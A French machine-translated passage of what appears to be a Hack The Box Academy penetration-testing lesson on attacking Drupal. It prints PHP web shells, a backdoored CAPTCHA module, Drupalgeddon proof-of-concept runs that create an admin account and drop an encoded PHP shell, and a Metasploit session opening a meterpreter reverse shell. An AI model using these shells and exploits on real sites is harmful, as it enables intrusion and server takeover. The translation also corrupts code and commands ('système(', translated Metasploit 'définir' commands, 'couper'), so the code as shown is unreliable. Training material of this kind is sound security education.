Attaquer Drupal
================

* * * * *

Maintenant que nous avons confirmé que nous faisons face à Drupal et que nous avons enregistré la version, regardons et voyons quelles erreurs de configuration et vulnérabilités nous pouvons découvrir pour tenter d'accéder au réseau interne.

Contrairement à certains CMS, obtenir un shell sur un hôte Drupal via la console d'administration n'est pas aussi simple que de simplement éditer un fichier PHP trouvé dans un thème ou de télécharger un script PHP malveillant.

* * * * *

Tirer parti du module de filtre PHP
--------------------------------

Dans les anciennes versions de Drupal (avant la version 8), il était possible de se connecter en tant qu'administrateur et d'activer le module `Filtre PHP` , qui "permet d'évaluer le code/extraits PHP intégrés".

![](https://academy.hackthebox.com/storage/modules/113/drupal_php_module.png)

À partir de là, nous pourrions cocher la case à côté du module et faire défiler jusqu'à `Enregistrer la configuration`. Ensuite, nous pourrions aller dans Contenu -> Ajouter du contenu et créer une `Page de base`.

![](https://academy.hackthebox.com/storage/modules/113/basic_page.png)

Nous pouvons maintenant créer une page avec un extrait PHP malveillant tel que celui ci-dessous. Nous avons nommé le paramètre avec un hachage md5 au lieu du commun `cmd` afin de ne pas laisser potentiellement la porte ouverte à un attaquant lors de notre évaluation. Si nous utilisions le `system($_GET['cmd']);` standard, nous nous exposons à un attaquant "drive-by" susceptible de tomber sur notre shell Web. Bien que peu probable, mieux vaut prévenir que guérir !

Code : php

```
<?php
système($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>

```

![](https://academy.hackthebox.com/storage/modules/113/basic_page_shell_7v2.png)

Nous voulons également nous assurer de définir la liste déroulante `Format de texte` sur `Code PHP`. Après avoir cliqué sur Enregistrer, nous serons redirigés vers la nouvelle page, dans cet exemple `http://drupal-qa.inlanefreight.local/node/3`. Une fois enregistré, nous pouvons soit demander l'exécution de commandes dans le navigateur en ajoutant `?dcfdd5e021a869fcc6dfaef8bf31377e=id` à la fin de l'URL pour exécuter la commande `id` ou utiliser `cURL` sur la ligne de commande. À partir de là, nous pourrions utiliser une doublure bash pour obtenir un accès inversé au shell.

```
dsgsec@htb[/htb]$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | couper -f4 -d">"

uid=33(www-data) gid=33(www-data) groupes=33(www-data)

```

À partir de la version 8, le module [Filtre PHP](https://www.drupal.org/project/php/releases/8.x-1.1) n'est pas installé par défaut. Pour tirer parti de cette fonctionnalité, nous devrions installer le module nous-mêmes. Étant donné que nous modifierions et ajouterions quelque chose à l'instance Drupal du client, nous voudrions peut-être d'abord vérifier avec eux. Nous commencerons par télécharger la version la plus récente du module sur le site Web de Drupal.

```
dsgsec@htb[/htb]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz

```

Une fois téléchargé, accédez à `Administration` > `Rapports` > `Mises à jour disponibles`.

Remarque : L'emplacement peut varier en fonction de la version de Drupal et peut se trouver dans le menu Étendre.

![](https://academy.hackthebox.com/storage/modules/113/install_module.png)

À partir de là, cliquez sur `Parcourir` sélectionnez le fichier dans le répertoire dans lequel nous l'avons téléchargé, puis cliquez sur `Installer`.

Une fois le module installé, nous pouvons cliquer sur `Contenu` et créer une nouvelle page de base, comme nous l'avons fait dans l'exemple Drupal 7. Encore une fois, assurez-vous de sélectionner `Code PHP` dans le menu déroulant `Format de texte` .

Avec l'un ou l'autre de ces exemples, nous devons tenir notre client informé et obtenir la permission avant d'apporter ce genre de modifications. De plus, une fois que nous avons terminé, nous devons supprimer ou désactiver le module `Filtre PHP` et supprimer toutes les pages que nous avons créées pour obtenir l'exécution de code à distance.

* * * * *

Téléchargement d'un module de porte dérobée
-----------------------------

Drupal permet aux utilisateurs disposant des autorisations appropriées de télécharger un nouveau module. Un module backdoor peut être créé en ajoutant un shell à un module existant. Les modules sont disponibles sur le site Web drupal.org. Choisissons un module tel que [CAPTCHA](https://www.drupal.org/project/captcha). Faites défiler vers le bas et copiez le lien pour le tar.gz [archive](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

Téléchargez l'archive et extrayez son contenu.

```
dsgsec@htb[/htb]$ wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
dsgsec@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz

```

Créez un shell Web PHP avec le contenu :

Code : php

```
<?php
système($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
?>

```

Ensuite, nous devons créer un fichier .htaccess pour nous donner accès au dossier. Ceci est nécessaire car Drupal refuse l'accès direct au dossier /modules.

Code : html

```
<IfModule mod_rewrite.c>
Moteur de réécriture activé
RéécrireBase /
</IfModule>

```

La configuration ci-dessus appliquera des règles pour le dossier / lorsque nous demanderons un fichier dans /modules. Copiez ces deux fichiers dans le dossier captcha et créez une archive.

```
dsgsec@htb[/htb]$ mv shell.php .htaccess captcha
dsgsec@htb[/htb]$ tar cvf captcha.tar.gz captcha/

captcha/
captcha/.travis.yml
captcha/README.md
captcha/captcha.api.php
captcha/captcha.inc
captcha/captcha.info.yml
captcha/captcha.install

<SNIP>

```

En supposant que nous ayons un accès administratif au site Web, cliquez sur `Gérer` puis `Étendre` dans la barre latérale. Ensuite, cliquez sur le bouton `+ Installer un nouveau module` et nous serons redirigés vers la page d'installation, telle que `http://drupal.inlanefreight.local/admin/modules/install` Parcourez l'archive Captcha dérobée et cliquez sur "Installer".

![](https://academy.hackthebox.com/storage/modules/113/module_installed.png)

Une fois l'installation réussie, accédez à `/modules/captcha/shell.php` pour exécuter les commandes.

```
dsgsec@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groupes=33(www-data)

```

* * * * *

Tirer parti des vulnérabilités connues
--------------------------------

Au fil des ans, le cœur de Drupal a souffert de quelques graves vulnérabilités d'exécution de code à distance, chacune appelée `Drupalgeddon`. Au moment de la rédaction de cet article, il existe 3 vulnérabilités Drupalgeddon.

- [CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005), connu sous le nom de Drupalgeddon, affecte les versions 7.0 à 7.31 et a été corrigé dans la version 7.32. Il s'agissait d'une faille d'injection SQL pré-authentifiée qui pouvait être utilisée pour télécharger un formulaire malveillant ou créer un nouvel utilisateur administrateur.

- [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002), également connue sous le nom de Drupalgeddon2, est une vulnérabilité d'exécution de code à distance, qui affecte les versions de Drupal antérieures à 7.58 et 8.5 .1. La vulnérabilité se produit en raison d'une désinfection insuffisante des entrées lors de l'enregistrement de l'utilisateur, ce qui permet d'injecter de manière malveillante des commandes au niveau du système.

- [CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/), également connue sous le nom de Drupalgeddon3, est une vulnérabilité d'exécution de code à distance qui affecte plusieurs versions de Drupal 7.x et 8. X. Cette faille exploite une validation incorrecte dans l'API Form.

Passons en revue l'exploitation de chacun d'entre eux.

* * * * *

Drupalgeddon
------------

Comme indiqué précédemment, cette faille peut être exploitée en tirant parti d'une injection SQL de pré-authentification qui peut être utilisée pour télécharger du code malveillant ou ajouter un utilisateur administrateur. Essayons d'ajouter un nouvel utilisateur administrateur avec ce script [PoC](https://www.exploit-db.com/exploits/34992) . Une fois qu'un utilisateur administrateur est ajouté, nous pouvons nous connecter et activer le module `Filtre PHP` pour réaliser l'exécution de code à distance.

L'exécution du script avec l'indicateur `-h` nous montre le menu d'aide.

```
dsgsec@htb[/htb]$ python2.7 drupalgeddon.py

   ______ __ _______ _______ _____
  | _ \ .----.--.--.-----.---.-| | | _ || _ | _ |
  |. | \| _| | | _ | _ | | |___| _|___| |.| |
  |. | |__| |_____| __|___._|__| / |___(__ `-|. |
  |: 1 / |__| | | |: 1 | |: |
  |::.. . / | | |::.. . | |::.|
  `------' `---' `-------' `---'
   _______ __ ___ __ __ __
  | _ .-----| | | .-----|__.-----.----| |_|__.-----.-----.
  | 1___| _ | | |. | | | -__| __| _| | _ | |
  |____ |__ |__| |. |__|__| |_____|____|____|__|_____|__|__|
  |: 1 | |__| |: | |___|
  |::.. . | |::.|
  `-------' `---'

                                  Drup4l => 7.0 <= 7.31 Sql-1nj3ct10n
                                               Administrateur 4cc0unt cr3at0r

Découvert par:

Stéphane Horst
                          (CVE-2014-3704)

                            Écrit par:

                          Claudio Viviani

                       http://www.homelab.it

                          info@homelab.it
                      homelabit@protonmail.ch

                  https://www.facebook.com/homelabit
                    https://twitter.com/homelabit
                  https://plus.google.com/+HomelabIt1/
        https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww

Utilisation : drupalgeddon.py -t http[s]://URL_CIBLE -u UTILISATEUR -p PASSE

Option :
   -h, --help affiche ce message d'aide et quitte
   -t CIBLE, --target=CIBLE
                         Insérer l'URL : http[s]://www.victim.com
   -u NOM D'UTILISATEUR, --username=NOM D'UTILISATEUR
                         Insérer le nom d'utilisateur
   -p PWD, --pwd=PWD Insérer le mot de passe

```

Ici, nous voyons que nous devons fournir l'URL cible ainsi qu'un nom d'utilisateur et un mot de passe pour notre nouveau compte administrateur. Exécutons le script et voyons si nous obtenons un nouvel utilisateur administrateur.

```
dsgsec@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

<SNIP>

[!] VULNÉRABLE!

[!] Utilisateur administrateur créé !

[*] Connexion : pirate informatique
[*] Pass : pwnd
[*] Url : http://drupal-qa.inlanefreight.local/?q=node&destination=node

```

Voyons maintenant si nous pouvons nous connecter en tant qu'administrateur. Nous pouvons! Maintenant, à partir de là, nous pourrions obtenir une coque par les différents moyens évoqués précédemment dans cette section.

![](https://academy.hackthebox.com/storage/modules/113/drupalgeddon.png)

Nous pourrions également utiliser le [exploit/multi/http/drupal_drupageddon](https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/) Module Metasploit pour exploiter cela.

* * * * *

Drupalgeddon2
--------------

Nous pouvons utiliser [this](https://www.exploit-db.com/exploits/44448) PoC pour confirmer cette vulnérabilité.

```
dsgsec@htb[/htb]$ python3 drupalgeddon2.py

################################################# ##############
# Preuve de concept pour CVE-2018-7600
# par Vitalii Rudnykh
# Merci par AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################# ##############
Fourni uniquement à des fins éducatives ou d'information

Saisissez l'URL cible (exemple : https://domain.ltd/) : http://drupal-dev.inlanefreight.local/

Vérifier : http://drupal-dev.inlanefreight.local/hello.txt

```

Nous pouvons vérifier rapidement avec `cURL` et voir que le fichier `hello.txt` a bien été téléchargé.

```
dsgsec@htb[/htb]$ curl -s http://drupal-dev.inlanefreight.local/hello.txt

;-)

```

Modifions maintenant le script pour obtenir l'exécution de code à distance en téléchargeant un fichier PHP malveillant.

Code : php

```
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>

```

```
dsgsec@htb[/htb]$ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K

```

Ensuite, remplaçons la commande `echo` dans le script d'exploitation par une commande pour écrire notre script PHP malveillant.

```
  echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64-d | tee mrb3n.php

```

Ensuite, exécutez le script d'exploitation modifié pour télécharger notre fichier PHP malveillant.

```
dsgsec@htb[/htb]$ python3 drupalgeddon2.py

################################################# ##############
# Preuve de concept pour CVE-2018-7600
# par Vitalii Rudnykh
# Merci par AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################# ##############
Fourni uniquement à des fins éducatives ou d'information

Saisissez l'URL cible (exemple : https://domain.ltd/) : http://drupal-dev.inlanefreight.local/

Vérifier : http://drupal-dev.inlanefreight.local/mrb3n.php

```

Enfin, nous pouvons confirmer l'exécution du code à distance à l'aide de `cURL`.

```
dsgsec@htb[/htb]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groupes=33(www-data)

```

* * * * *

Drupalgeddon3
--------------

[Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3) est une vulnérabilité d'exécution de code à distance authentifiée qui affecte [plusieurs versions](https://www.drupal.org/sa-core-2018-004) de Drupal cœur. Il nécessite qu'un utilisateur ait la possibilité de supprimer un nœud. Nous pouvons exploiter cela en utilisant Metasploit, mais nous devons d'abord nous connecter et obtenir un cookie de session valide.

![image](https://academy.hackthebox.com/storage/modules/113/burp.png)

Une fois que nous avons le cookie de session, nous pouvons configurer le module exploit comme suit.

```
exploit msf6 (multi/http/drupal_drupageddon3)> définir les rhosts 10.129.42.195
exploit msf6 (multi/http/drupal_drupageddon3)> définir VHOST drupal-acc.inlanefreight.local
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
exploit msf6 (multi/http/drupal_drupageddon3) > définir DRUPAL_NODE 1
exploit msf6 (multi/http/drupal_drupageddon3)> définir LHOST 10.10.14.15
exploit msf6 (multi/http/drupal_drupageddon3) > afficher les options

Options du module (exploit/multi/http/drupal_drupageddon3) :

    Nom Paramètre actuel requis Description
    ---- --------------- -------- -----------
    DRUPAL_NODE 1 oui Numéro de nœud existant (page, article, sujet de forum ou message)
    DRUPAL_SESSION SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y oui Session de cookie authentifiée
    Proxies non Une chaîne de proxy au format type:host:port[,type:host:port][...]
    RHOSTS 10.129.42.195 oui Le ou les hôtes cibles, l'identifiant CIDR de la plage ou le fichier d'hôtes avec la syntaxe 'file:<path>'
    RPORT 80 oui Le port cible (TCP)
    SSL false non Négocier SSL/TLS pour les connexions sortantes
    TARGETURI / oui L'URI cible de l'installation Drupal
    VHOST drupal-acc.inlanefreight.local pas de service HTTPr hôte virtuel

Options de charge utile (php/meterpreter/reverse_tcp) :

    Nom Paramètre actuel requis Description
    ---- --------------- -------- -----------
    LHOST 10.10.14.15 oui L'adresse d'écoute (une interface peut être spécifiée)
    LPORT 4444 oui Le port d'écoute

Cible d'exploitation :

    Nom d'identification
    -- ----
    0 Formulaire d'inscription de l'utilisateur avec exec

```

En cas de succès, nous obtiendrons un reverse shell sur l'hôte cible.

```
exploit msf6 (multi/http/drupal_drupageddon3) > exploit

[*] Démarrage du gestionnaire TCP inversé le 10.10.14.15:4444
[*] Formulaire de jeton -> GH5mC4x2UeKKb2Dp6Mhk4A9082u9BU_sWtEudedxLRM
[*] Jeton Form_build_id -> form-vjqTCj2TvVdfEiPtfbOSEF8jnyB6eEpAPOSHUR2Ebo8
[*] Étape d'envoi (39264 octets) vers 10.129.42.195
[*] Session Meterpreter 1 ouverte (10.10.14.15:4444 -> 10.129.42.195:44612) au 2021-08-24 12:38:07 -0400

meterpreter > getuid

Nom d'utilisateur du serveur : www-data (33)

meterpreter > sysinfo

Ordinateur : app01
OS : Linux app01 5.4.0-81-generic #91-Ubuntu SMP Jeu 15 juillet 19:09:17 UTC 2021 x86_64
Meterpreter : php/linux

```

* * * * *

À partir de
-------

Nous avons énuméré et attaqué certains des CMS les plus répandus : WordPress, Drupal et Joomla. Passons ensuite à Tomcat, qui fait sourire les pentesters depuis des années.